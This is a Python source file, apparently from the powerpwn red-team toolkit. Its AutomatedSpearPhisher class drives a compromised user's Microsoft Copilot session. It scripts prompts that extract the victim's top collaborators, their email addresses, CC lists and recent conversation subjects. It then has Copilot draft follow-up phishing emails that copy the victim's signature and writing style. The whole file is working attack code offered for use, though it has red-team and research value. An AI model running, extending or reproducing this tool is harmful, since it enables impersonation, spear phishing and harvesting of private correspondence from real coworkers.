import uuid
from typing import Optional

from powerpwn.copilot.chat_automator.chat_automator import ChatAutomator
from powerpwn.copilot.exceptions.copilot_connected_user_mismatch import CopilotConnectedUserMismatchException
from powerpwn.copilot.exceptions.copilot_connection_failed_exception import CopilotConnectionFailedException
from powerpwn.copilot.models.chat_argument import ChatArguments
from powerpwn.copilot.websocket_message.websocket_message import WebsocketMessage
from powerpwn.spearphishing.log_formatting.log_type_enum import LogType
from powerpwn.spearphishing.log_formatting.spear_phising_log_formatter import SpearPhishingLogFormatter
from powerpwn.spearphishing.log_formatting.spear_phising_websocket_message_formatter import SpearPhishingWebsocketMessageFormatter
from powerpwn.spearphishing.phishing_email_params import PhishingEmailParameters


class AutomatedSpearPhisher:
    """
    A class for automated spear phishing
    It targets the compromised user's top collaborators and crafts phishing emails for them
    """

    _SEPARATOR = "****"
    _SPECIAL_CHARS = "#####"

    def __init__(self, arguments: ChatArguments) -> None:
        self.__chat_automator = ChatAutomator(arguments)
        self.__execution_id = str(uuid.uuid4())
        self.__file_path = f"phishing_results_{self.__execution_id}.log"
        self.__websocket_formatter = SpearPhishingWebsocketMessageFormatter()
        self.__log_formatter = SpearPhishingLogFormatter()

    def phish(self) -> None:
        try:
            # Provide Cites or references
            phishing_emails = []
            self.__log(LogType.tool, "Starting phishing ...")
            self.__log(LogType.tool, f"Result will be saved in {self.__file_path}")
            self.__chat_automator.init_connector()

            prompt = f"list my top collaborators separated by '{self._SEPARATOR}' and nothing else. if you don't find any, print '{self._SPECIAL_CHARS}' and nothing else. do not print any reference"
            self.__log(LogType.prompt, prompt)

            resp = self.__chat_automator.send_prompt(prompt)
            self.__log_response(resp)
            formatted_resp = self.__get_formatted_response(resp)

            collaborators = (
                formatted_resp.split(self._SEPARATOR)
                if formatted_resp and self._SEPARATOR in formatted_resp and self._SPECIAL_CHARS not in formatted_resp
                else []
            )
            for collaborator in collaborators:
                if collaborator:
                    phishing_emails.append(self.phish_for_collaborator(collaborator))

            self.__log(LogType.none, message="-----------------------------------------------------------------")
            self.__log(LogType.tool, "Phishing Completed.")
            self.__log(LogType.tool, "Results:")
            for idx, email in enumerate(phishing_emails):
                self.__log(LogType.none, message=f"Email #{idx + 1} Details:")
                self.__log(LogType.none, message=f"Email to: {email.to}")
                self.__log(LogType.none, message=f"Email cc: {email.cc}")
                self.__log(LogType.none, message=f"Email subject: {email.subject}")
                self.__log(LogType.none, message=f"Email body: {email.body}")
                self.__log(LogType.none, message="-----------------------------------------------------------------")
        except CopilotConnectionFailedException as e:
            self.__log(LogType.tool, f"Failed to connect to Copilot: {e.message}")
        except CopilotConnectedUserMismatchException as e:
            self.__log(LogType.tool, f"{e.message}")

    def phish_for_collaborator(self, collaborator: str) -> PhishingEmailParameters:
        self.__log(LogType.tool, f"Starting phishing for collaborator {collaborator}...")

        cc_list = []
        collaborator_email = ""
        resp = self.__get_collaborator_email(collaborator)
        if not resp:
            resp = self.__get_collaborator_email(collaborator)

        if resp:
            collaborator_email = resp

        prompt = f"what was the last conversation with {collaborator}?"
        self.__log(LogType.prompt, prompt)
        resp = self.__chat_automator.send_prompt(prompt)
        self.__log_response(resp)

        prompt = f"who is on the CC list in the last conversation with {collaborator}? print them as list separated by '{self._SEPARATOR}' and nothing else.if you don't find any, print '{self._SPECIAL_CHARS}' and nothing else.  do not print any reference"
        self.__log(LogType.prompt, prompt)

        resp = self.__send_prompt(prompt, resp)
        self.__log_response(resp)
        formatted_resp = self.__get_formatted_response(resp)

        if formatted_resp and self._SEPARATOR in formatted_resp and self._SPECIAL_CHARS not in formatted_resp:
            for involved in formatted_resp.split(self._SEPARATOR):
                if involved:
                    if email := self.__get_cc_email(involved):
                        cc_list.append(email)

        prompt = f"what is the subject of the last conversation with {collaborator}? print the subject and nothing else"
        self.__log(LogType.prompt, prompt)
        email_subject = self.__chat_automator.send_prompt(prompt)
        self.__log_response(email_subject)

        prompt = f"look at the signature i used in the last conversation with {collaborator} if exists. and then craft a follow up email that i can reply to {collaborator}. make it look similar to my style in writing emails for example using characters or expressions that i use, etc ..."
        self.__log(LogType.prompt, prompt)
        email_body = self.__chat_automator.send_prompt(prompt)
        self.__log_response(email_body)

        return PhishingEmailParameters(
            to=collaborator_email, cc=cc_list, body=self.__get_formatted_response(email_body), subject=self.__get_formatted_response(email_subject)
        )

    def __send_prompt(self, prompt: str, response: Optional[str]) -> str:
        if response:
            return self.__chat_automator.send_prompt(prompt)
        raise Exception("Previous response is None")

    def __get_cc_email(self, involved: str) -> Optional[str]:
        if "@" in involved:
            return involved
        else:
            prompt = f"what is the email of {involved}? print the email and nothing else. do not print any reference"
            self.__log(LogType.prompt, prompt)
            cc_email = self.__chat_automator.send_prompt(prompt)
            self.__log_response(cc_email)
            formatted_cc_email = self.__get_formatted_response(cc_email)
            if formatted_cc_email and "@" in formatted_cc_email:
                return formatted_cc_email

    def __get_collaborator_email(self, collaborator: str) -> Optional[str]:
        prompt = f"what is the email of {collaborator}?. print the email and nothing else. do not print any reference"
        self.__log(LogType.prompt, prompt)

        resp = self.__chat_automator.send_prompt(prompt)
        self.__log_response(resp)
        formatted_response = self.__get_formatted_response(resp)

        if formatted_response and "@" in formatted_response:
            return formatted_response
        return None

    def __log(self, log_type: LogType, message: str) -> None:

        to_log = self.__log_formatter.format(message, log_type)
        with open(self.__file_path, "a") as file:
            file.write(to_log + "\n\n")
            print(to_log)

    def __log_response(self, websocket_resp: Optional[WebsocketMessage]) -> None:
        if formatted_message := self.__get_formatted_response(websocket_resp):
            self.__log(LogType.response, formatted_message)
        else:
            self.__log(LogType.response, "None")

    def __get_formatted_response(self, websocket_resp: Optional[WebsocketMessage]) -> Optional[str]:
        if websocket_resp:
            message = self.__websocket_formatter.format(websocket_resp.parsed_message)
            return message
        return None
